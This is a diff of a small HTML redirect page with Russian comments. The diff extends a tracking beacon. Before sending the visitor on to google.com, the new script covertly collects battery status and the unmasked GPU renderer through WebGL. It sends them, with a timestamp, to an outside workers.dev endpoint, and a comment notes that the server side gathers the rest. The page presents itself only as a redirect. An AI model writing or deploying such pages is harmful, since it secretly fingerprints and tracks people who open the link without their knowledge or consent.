@@ -1,24 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-</head>
+<head><meta charset="UTF-8"></head>
 <body>
-    <script>
-        const t = encodeURIComponent(new Date().toLocaleString());
-        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
-        
-        const i = new Image();
-        const go = () => window.location.replace("https://google.com");
-        
-        i.onload = go;
-        i.onerror = go;
-        
-        // Отправляем только метку времени, остальное соберет воркер на сервере
-        i.src = workerUrl + "?t=" + t;
+<script>
+async function xray() {
+    let stats = { batt: "N/A", gpu: "N/A" };
 
-        setTimeout(go, 2000);
-    </script>
+    try {
+        // Сбор данных о батарее
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            stats.batt = `${Math.round(b.level * 100)}% [${b.charging ? 'Charging' : 'Battery'}]`;
+        }
+        // Сбор данных о видеокарте
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            stats.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "WebGL_On";
+        }
+    } catch (e) { console.error(e); }
+
+    const t = encodeURIComponent(new Date().toLocaleString('ru-RU'));
+    const d = encodeURIComponent(JSON.stringify(stats));
+    const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
+    
+    // Формируем финальный URL запроса
+    const finalRequest = `${workerUrl}?t=${t}&d=${d}&_=${Date.now()}`;
+    
+    const img = new Image();
+    const redirect = () => window.location.replace("https://google.com");
+    
+    img.onload = redirect;
+    img.onerror = redirect;
+    img.src = finalRequest;
+
+    // Резервный редирект (2.5 сек), если Image() не сработал
+    setTimeout(redirect, 2500);
+}
+
+xray();
+</script>
 </body>
 </html>
